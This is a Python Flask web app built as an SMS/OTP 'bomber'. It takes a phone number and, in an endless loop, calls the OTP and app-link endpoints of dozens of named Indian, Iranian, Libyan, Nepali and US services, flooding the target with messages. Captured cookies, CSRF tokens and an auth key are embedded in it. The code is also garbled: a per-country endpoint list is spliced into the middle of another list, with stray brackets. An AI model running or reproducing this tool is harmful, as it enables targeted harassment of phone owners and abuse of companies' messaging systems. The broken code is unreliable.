import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*"
    }

    while active_tasks.get(mobile):
        print(f"--- Bombing Round {count} Started for {mobile} ---")
        
        # 1. JustDial (GET)
        try: session.get(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}", headers=headers, timeout=5)
        except: pass

        # 2. ConfirmTkt (POST)
        try: session.post("https://securedapi.confirmtkt.com/api/platform/register", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 3. Allen Solly (POST)
        try: session.post("https://www.allensolly.com/capillarylogin/validateMobileOrEMail", data={"mobileoremail": mobile}, headers=headers, timeout=5)
        except: pass

        # 4. Housing.com (POST)
        try: session.post("https://login.housing.com/api/v2/send-otp", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 5. Ajio (POST)
        try: session.post("https://login.web.ajio.com/api/auth/signupSendOTP", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 6. Unacademy (POST)
        try: session.post("https://unacademy.com/api/v1/user/get_app_link/", data={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 7. Treebo (POST)
        try: session.post("https://www.treebo.com/api/v2/auth/login/otp/", json={"phone_number": mobile}, headers=headers, timeout=5)
        except: pass

        # 8. PharmEasy (POST)
        try: session.post("https://pharmeasy.in/api/auth/requestOTP", json={"contactNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 9. Dream11 (POST)
        try: session.post("https://api.dream11.com/sendsmslink", json={"mobileNum": mobile}, headers=headers, timeout=5)
        except: pass

        # 10. Cashify (GET)
        try: session.get(f"https://www.cashify.in/api/cu01/v1/app-link?mn={mobile}", headers=headers, timeout=5)
        except: pass

        # 11. KFC (POST)
        try: session.post("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", json={"phoneNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 12. Airtel (GET)
        try: session.get(f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={mobile}", headers=headers, timeout=5)
        except: pass

        # 13. HappyEasyGo (GET)
        try: session.get(f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{mobile}", headers=headers, timeout=5)
        except: pass

        # 14. Porter (POST)
        try: session.post("https://porter.in/restservice/send_app_link_sms", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 15. IndiaLends (POST)
        try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
        except: pass
        apis = [
        {
            "name": "Snapp V1",
            "method": "POST",
            "url": "https://api.snapp.ir/api/v1/sms/link",
            "data": {"phone": mobile},
        },
                {
                "name": "3Via",
                "method": "POST",
                "url": "https://3via.ly/api/client/login",
                "data": {
                    "msisdn": "{target}",
                    "device_type": "web"
                },
                "identifier": "Otp Sent successfully"
            },
            {
                "name": "Winmore",
                "method": "POST",
                "url": "https://winmore.ly/api/p10/public/get_started",
                "data": {
                    "phone": "{target}",
                    "countryCode": "ly",
                    "language": "en",
                    "utm": {}
                },
                "identifier": "SUBSCRIBED"
            },
            {
                "name": "Lingo",
                "method": "POST",
                "url": "https://lingo.ly/api/client/login",
                "data": {
                    "msisdn": "{target}"
                },
                "identifier": "OTP Sended successfully"
            },
            {
                "name": "Bekam",
                "method": "POST",
                "url": "https://bekam.ly/api/client/login",
                "data": {
                    "msisdn": "{target}"
                },
                "identifier": "OTP Send Successfully"
            }
        ],
        "977": [
            {
                "name": "Daraz Nepal",
                "method": "POST",
                "url": "https://member.daraz.com.np/user/api/sendVerificationSms",
                "data": {
                    "phone": "{target}",
                    "type": "OTP_REGISTER",
                    "lzdAppVersion": "1.0",
                    "X-CSRF-TOKEN": "57343b8557abe",
                    "ncToken": {
                        "csessionid": "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
                        "sig": "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
                        "token": "QPXW:1638536554908:0.22529358478093664"
                    }
                },
                "headers": {
                    "X-CSRF-TOKEN": "57343b8557abe",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://member.daraz.com.np",
                    "Referer": "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
                    "Cookie": "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33"
                },
                "identifier": "\"notSuccess\":false"
            },
            {
                "name": "Clamphook",
                "method": "POST",
                "url": "https://backend.clamphook.com//auth/register",
                "json": {
                    "mobile": "{cc}-{target}"
                },
                "headers": {
                    "Host": "backend.clamphook.com",
                    "Origin": "https://clamphook.com",
                    "Referer": "https://clamphook.com/",
                    "Sec-Fetch-Mode": "cors"
                },
                "identifier": "\"success\":true"
            },
            {
                "name": "Foodmario",
                "method": "POST",
                "url": "https://api.foodmario.com/api/v2/customer/send-otp",
                "data": {
                    "phone": "{target}",
                    "country_code": "{cc}"
                },
                "identifier": "success"
            },
            {
                "name": "Sastodeal",
                "method": "POST",
                "url": "https://www.sastodeal.com/sd/otp_login_send_otp",
                "data": {
                    "phone": "{target}",
                    "otp_type": "login"
                },
                "identifier": "success"
            }
        ],
        "91": [
            {
                "name": "confirmtkt",
                "method": "GET",
                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                "params": {
                    "newOtp": "true",
                    "mobileNumber": "{target}"
                },
                "identifier": "false"
            },
            {
                "name": "justdial",
                "method": "GET",
                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                "params": {
                    "mobile": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "allensolly",
                "method": "POST",
                "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                "data": {
                    "mobileoremail": "{target}",
                    "name": "markluther"
                },
                "identifier": "true"
            },
            {
                "name": "frotels",
                "method": "POST",
                "url": "https://www.frotels.com/appsendsms.php",
                "data": {
                    "mobno": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "gapoon",
                "method": "POST",
                "url": "https://www.gapoon.com/userSignup",
                "data": {
                    "mobile": "{target}",
                    "email": "noreply@gmail.com",
                    "name": "LexLuthor"
                },
                "identifier": "1"
            },
            {
                "name": "housing",
                "method": "POST",
                "url": "https://login.housing.com/api/v2/send-otp",
                "data": {
                    "phone": "{target}"
                },
                "identifier": "Sent"
            },
            {
                "name": "porter",
                "method": "POST",
                "url": "https://porter.in/restservice/send_app_link_sms",
                "data": {
                    "phone": "{target}",
                    "referrer_string": "",
                    "brand": "porter"
                },
                "identifier": "true"
            },
            {
                "name": "cityflo",
                "method": "POST",
                "url": "https://cityflo.com/website-app-download-link-sms/",
                "data": {
                    "mobile_number": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "nnnow",
                "method": "POST",
                "url": "https://api.nnnow.com/d/api/appDownloadLink",
                "data": {
                    "mobileNumber": "{target}"
                },
                "identifier": "true"
            },
            {
                "name": "ajio",
                "method": "POST",
                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
                "data": {
                    "firstName": "xxps",
                    "login": "wiqpdl223@wqew.com",
                    "password": "QASpw@1s",
                    "genderType": "Male",
                    "mobileNumber": "{target}",
                    "requestType": "SENDOTP"
                },
                "identifier": "1"
            },
            {
                "name": "happyeasygo",
                "method": "GET",
                "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
                "params": {
                    "phone": "91%20{target}"
                },
                "identifier": "true"
            },
            {
                "name": "unacademy",
                "method": "POST",
                "url": "https://unacademy.com/api/v1/user/get_app_link/",
                "data": {
                    "phone": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "treebo",
                "method": "POST",
                "url": "https://www.treebo.com/api/v2/auth/login/otp/",
                "data": {
                    "phone_number": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "airtel",
                "method": "GET",
                "url": "https://www.airtel.in/referral-api/core/notify",
                "params": {
                    "messageId": "map",
                    "rtn": "{target}"
                },
                "identifier": "Success"
            },
            {
                "name": "pharmeasy",
                "method": "POST",
                "url": "https://pharmeasy.in/api/auth/requestOTP",
                "json": {
                    "contactNumber": "{target}"
                },
                "identifier": "resendSmsCounter"
            },
            {
                "name": "mylescars",
                "method": "POST",
                "url": "https://www.mylescars.com/usermanagements/chkContact",
                "data": {
                    "contactNo": "{target}"
                },
                "identifier": "success@::::"
            },
            {
                "name": "grofers",
                "method": "POST",
                "url": "https://grofers.com/v2/accounts/",
                "data": {
                    "user_phone": "{target}"
                },
                "headers": {
                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
                },
                "identifier": "We have sent"
            },
            {
                "name": "dream11",
                "method": "POST",
                "url": "https://api.dream11.com/sendsmslink",
                "data": {
                    "siteId": "1",
                    "mobileNum": "{target}",
                    "appType": "androidfull"
                },
                "identifier": "true"
            },
            {
                "name": "cashify",
                "method": "GET",
                "url": "https://www.cashify.in/api/cu01/v1/app-link",
                "params": {
                    "mn": "{target}"
                },
                "identifier": "Successfully"
            },
            {
                "name": "paytm",
                "method": "POST",
                "url": "https://commonfront.paytm.com/v4/api/sendsms",
                "data": {
                    "phone": "{target}",
                    "guid": "2952fa812660c58dc160ca6c9894221d"
                },
                "identifier": "202"
            },
            {
                "name": "kfc-in",
                "method": "POST",
                "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
                "headers": {
                    "Referer": "https://online.kfc.co.in/login",
                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
                },
                "json": {
                    "AuthorizedFor": "3",
                    "phoneNumber": "{target}",
                    "Resend": "false"
                },
                "identifier": "true"
            },
            {
                "name": "indialends",
                "method": "POST",
                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
                "cookies": {
                    "_ga": "GA1.2.1483885314.1559157646",
                    "_fbp": "fb.1.1559157647161.1989205138",
                    "TiPMix": "91.9909185226964",
                    "gcb_t_track": "SEO - Google",
                    "gcb_t_keyword": "",
                    "gcb_t_l_url": "https://www.google.com/",
                    "gcb_utm_medium": "",
                    "gcb_utm_campaign": "",
                    "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
                    "web_app_landing_utm_source": "",
                    "web_app_landing_url": "/personal-loan",
                    "webapp_landing_referral_url": "https://www.google.com/",
                    "ARRAffinity": "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
                    "_gid": "GA1.2.969623705.1560660444",
                    "_gat": "1",
                    "current_url": "https://indialends.com/personal-loan",
                    "cookies_plbt": "0"
                },
                "headers": {
                    "Referer": "https://indialends.com/personal-loan"
                },
                "data": {
                    "aeyder03teaeare": "1",
                    "ertysvfj74sje": "{cc}",
                    "jfsdfu14hkgertd": "{target}",
                    "lj80gertdfg": "0"
                },
                "identifier": "1"
            },
            {
                "name": "swiggy",
                "method": "POST",
                "url": "https://www.swiggy.com/dapi/auth/sms-otp",
                "data": {
                    "mobile": "{target}"
                },
                "identifier": "success"
            },
            {
                "name": "zomato",
                "method": "POST",
                "url": "https://www.zomato.com/php/oauth_otp.php",
                "data": {
                    "phone": "{target}",
                    "otp_via": "whatsapp"
                },
                "identifier": "status"
            },
            {
                "name": "bigbasket",
                "method": "POST",
                "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/send/",
                "data": {
                    "phone": "{target}",
                    "channel": "sms"
                },
                "identifier": "success"
            },
            {
                "name": "amazon",
                "method": "POST",
                "url": "https://www.amazon.in/ap/signin",
                "data": {
                    "email": "{target}",
                    "create": "0"
                },
                "identifier": "Enter OTP"
            },
            {
                "name": "flipkart",
                "method": "POST",
                "url": "https://www.flipkart.com/api/6/user/signup/status",
                "data": {
                    "loginId": "{target}",
                    "supportAllStates": "true"
                },
                "identifier": "success"
            },
            {
                "name": "myntra",
                "method": "POST",
                "url": "https://www.myntra.com/otp/generate",
                "data": {
                    "phone": "{target}"
                },
                "identifier": "otp_sent"
            },
            {
                "name": "snapdeal",
                "method": "POST",
                "url": "https://www.snapdeal.com/authenticate/emailOrMobile",
                "data": {
                    "mobile": "{target}",
                    "checkUser": "1"
                },
                "identifier": "success"
            },
            {
                "name": "ola",
                "method": "POST",
                "url": "https://api.olacabs.com/v1/oauth/otp",
                "data": {
                    "phone": "{target}",
                    "country_code": "{cc}"
                },
                "identifier": "reason"
            },
            {
                "name": "uber",
                "method": "POST",
                "url": "https://auth.uber.com/v2/oauth/token",
                "data": {
                    "client_id": "eCAbBp7pFFl4kVJwyvjq1xdWfpeJyu1d",
                    "phone": "{target}",
                    "scope": "eats.order"
                },
                "identifier": "sent"
            },
            {
                "name": "rapido",
                "method": "POST",
                "url": "https://rapido.bike/Customer/authenticate",
                "data": {
                    "phone": "{target}",
                    "country_code": "{cc}"
                },
                "identifier": "success"
            },
            {
                "name": "dominos",
                "method": "POST",
                "url": "https://order.godominos.co.in/Online/Verification.aspx/SendOTP",
                "data": {
                    "MobileNo": "{target}"
                },
                "identifier": "d"
            },
            {
                "name": "pizzahut",
                "method": "POST",
                "url": "https://www.pizzahut.co.in/account/sendotp",
                "data": {
                    "mobile": "{target}",
                    "email": "test@example.com"
                },
                "identifier": "success"
            }
        ],
        "1": [
            {
                "name": "twitter",
                "method": "POST",
                "url": "https://api.twitter.com/1.1/onboarding/task.json",
                "data": {
                    "flow_token": "flow_token",
                    "phone_number": "{target}",
                    "country_code": "{cc}"
                },
                "identifier": "success"
            },
            {
                "name": "facebook",
                "method": "POST",
                "url": "https://www.facebook.com/ajax/auth/send_sms_code.php",
                "data": {
                    "phone": "{target}",
                    "country_code": "{cc}",
                    "firstrun": "true"
                },
                "identifier": "success"
            },
            {
                "name": "instagram",
                "method": "POST",
                "url": "https://www.instagram.com/accounts/send_signup_sms_code/",
                "data": {
                    "phone_number": "{target}",
                    "country_code": "{cc}"
                },
                "identifier": "phone_number_valid"
            },
            {
                "name": "whatsapp",
                "method": "POST",
                "url": "https://web.whatsapp.com/api/check",
            }
        {
            "name": "Snapp V2",
            "method": "POST",
            "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={mobile}",
            "data": {"cellphone": mobile},
        },
        {
            "name": "Achareh",
            "method": "POST",
            "url": "https://api.achareh.co/v2/accounts/login/",
            "data": {"phone": f"98{mobile[1:]}"},
        },
        {
            "name": "Zigap",
            "method": "POST",
            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
            "data": {"phoneNumber": f"+98{mobile[1:]}"},
        },
        {
            "name": "Jabama",
            "method": "POST",
            "url": "https://gw.jabama.com/api/v4/account/send-code",
            "data": {"mobile": mobile},
        },
        {
            "name": "Banimode",
            "method": "POST",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": mobile},
        },
        {
            "name": "Classino",
            "method": "POST",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": mobile},
        },
        {
            "name": "Digikala V1",
            "method": "POST",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {"username": mobile, "otp_call": False},
        },
        {
            "name": "Digikala V2",
            "method": "POST",
            "url": "https://api.digikala.com/v1/user/forgot/check/",
            "data": {"username": mobile},
        },
        {
            "name": "Sms.ir",
            "method": "POST",
            "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
            "data": mobile,
        },
        {
            "name": "Alibaba",
            "method": "POST",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": mobile[1:]},
        },
        {
            "name": "Divar",
            "method": "POST",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": mobile},
        },
        {
            "name": "Sheypoor",
            "method": "POST",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": mobile},
        },
        {
            "name": "Bikoplus",
            "method": "POST",
            "url": "https://bikoplus.com/account/check-phone-number",
            "data": {"phoneNumber": mobile},
        },
        {
            "name": "Mootanroo",
            "method": "POST",
            "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
            "data": {"PhoneNumber": mobile},
        },
        {
            "name": "Tap33",
            "method": "POST",
            "url": "https://tap33.me/api/v2/user",
            "data": {"credential": {"phoneNumber": mobile, "role": "BIKER"}},
        },
        {
            "name": "Tapsi",
            "method": "POST",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {"phoneNumber": mobile, "role": "DRIVER"},
                "otpOption": "SMS",
            },
        },
        {
            "name": "GapFilm",
            "method": "POST",
            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
            "data": {"Type": "3", "Username": mobile[1:]},
        },
        {
            "name": "IToll",
            "method": "POST",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "data": {"mobile": mobile},
        },
        {
            "name": "Anargift",
            "method": "POST",
            "url": "https://api.anargift.com/api/v1/auth/auth",
            "data": {"mobile_number": mobile},
        },
        {
            "name": "Nobat",
            "method": "POST",
            "url": "https://nobat.ir/api/public/patient/login/phone",
            "data": {"mobile": mobile[1:]},
        },
        {
            "name": "Lendo",
            "method": "POST",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": mobile},
        },
        {
            "name": "Hamrah-Mechanic",
            "method": "POST",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {"PhoneNumber": mobile},
        },
        {
            "name": "Abantether",
            "method": "POST",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": mobile},
        },
        {
            "name": "OKCS",
            "method": "POST",
            "url": "https://my.okcs.com/api/check-mobile",
            "data": {"mobile": mobile},
        },
        {
            "name": "Tebinja",
            "method": "POST",
            "url": "https://www.tebinja.com/api/v1/users",
            "data": {"username": mobile},
        },
        {
            "name": "Bit24",
            "method": "POST",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "data": {"mobile": mobile},
        },
        {
            "name": "Rojashop",
            "method": "POST",
            "url": "https://rojashop.com/api/send-otp-register",
            "data": {"mobile": mobile},
        },
        {
            "name": "Paklean",
            "method": "POST",
            "url": "https://client.api.paklean.com/download",
            "data": {"tel": mobile},
        },
        {
            "name": "Khodro45",
            "method": "POST",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "data": {"mobile": mobile},
        },
        {
            "name": "Delino",
            "method": "POST",
            "url": "https://www.delino.com/user/register",
            "data": {"mobile": mobile},
        },
        {
            "name": "DigikalaJet",
            "method": "POST",
            "url": "https://api.digikalajet.ir/user/login-register/",
            "data": {"phone": mobile},
        },
        {
            "name": "Miare",
            "method": "POST",
            "url": "https://www.miare.ir/api/otp/driver/request/",
            "data": {"phone_number": mobile},
        },
        {
            "name": "Dosma",
            "method": "POST",
            "url": "https://app.dosma.ir/api/v1/account/send-otp/",
            "data": {"mobile": mobile},
        },
        {
            "name": "Ostadkr",
            "method": "POST",
            "url": "https://api.ostadkr.com/login",
            "data": {"mobile": mobile},
        },
        {
            "name": "Sibbazar",
            "method": "POST",
            "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
            "data": {"username": mobile},
        },
        {
            "name": "Namava",
            "method": "POST",
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": {"UserName": f"+98{mobile[1:]}"},
        },
        {
            "name": "Shab",
            "method": "POST",
            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
            "data": {"mobile": mobile},
        },
        {
            "name": "Bitpin",
            "method": "POST",
            "url": "https://api.bitpin.org/v2/usr/signin/",
            "data": {"phone": mobile},
        },
        {
            "name": "Taaghche",
            "method": "POST",
            "url": "https://gw.taaghche.com/v4/site/auth/signup",
            "data": {"contact": mobile},
        },
        # {
        #     "name": "Digipay",
        #     "method": "POST",
        #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
        #     "data": {"cellNumber": mobile},
        # }, # This one will send your IP to your target.
    ]
    for api in apis:
        try:
            if api["method"] == "POST":
                session.post(api["url"], json=api["data"])
            elif api["method"] == "GET":
                session.get(api["url"])
        except:
            pass
            
    print(f"Round {count} Finished.")
    count += 1
    time.sleep(1)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": f"Multi-API Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)